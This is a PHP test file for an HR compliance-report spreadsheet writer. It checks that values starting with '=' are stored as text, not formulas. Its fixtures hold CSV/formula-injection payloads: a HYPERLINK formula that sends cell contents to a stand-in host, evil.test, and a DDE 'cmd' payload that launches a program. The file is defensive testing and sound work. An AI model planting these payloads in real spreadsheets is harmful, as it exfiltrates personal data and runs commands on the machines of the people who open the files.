<?php

use App\Domain\ComplianceReports\Support\ReportSheet;
use App\Domain\ComplianceReports\Support\XlsxWorkbook;

/*
| QA security: the statutory registers HR downloads as .xlsx carry names and addresses people type themselves. A value
| that starts with "=" must stay text in the workbook — a live formula there runs (or phones home) when HR opens it.
*/

/** The XML of a workbook's first sheet. */
function firstSheetXml(string $path): string
{
    $zip = new ZipArchive;
    $zip->open($path);
    $xml = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
    $zip->close();

    return $xml;
}

it('writes text that looks like a formula as text, in rows and in the header block', function () {
    $formula = '=HYPERLINK("https://evil.test/?"&B5&C5,"Ravi")';
    $sheet = new ReportSheet(
        title: 'Register of employees',
        columns: ['name' => 'Name', 'address' => 'Address', 'wages' => 'Wages'],
        rows: [['name' => $formula, 'address' => '=1+1', 'wages' => 1000.0]],
        header: [['Establishment', '=cmd|\' /C calc\'!A0']],
        money: ['wages'],
    );
    $path = tempnam(sys_get_temp_dir(), 'qa').'.xlsx';

    try {
        XlsxWorkbook::write([$sheet], $path);
        $xml = firstSheetXml($path);
    } finally {
        @unlink($path);
    }

    expect($xml)->not->toContain('<f>')
        ->and($xml)->toContain('HYPERLINK')
        ->and($xml)->toContain('1000');
});
